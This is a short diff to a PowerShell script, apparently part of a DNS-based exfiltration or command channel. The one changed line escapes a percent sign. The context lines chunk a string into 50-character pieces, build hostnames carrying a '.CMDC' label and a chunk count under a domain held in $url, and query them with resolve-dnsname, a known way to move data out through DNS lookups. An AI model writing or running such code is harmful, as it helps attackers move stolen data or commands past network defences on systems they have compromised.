@@ -39,7 +39,7 @@ $string = $string -replace '-','';
 $len = $string.Length;
 $split = 50;
 $repeat=[Math]::Floor($len/$split);
-$remainder=$len%$split;
+$remainder=$len%%$split;
 if($remainder){ $repeatr = $repeat+1};
 $rnd = Get-Random;$ur = $rnd.toString()+".CMDC"+$repeatr.ToString()+"."+$url;
 $q = resolve-dnsname -type 1 $ur;
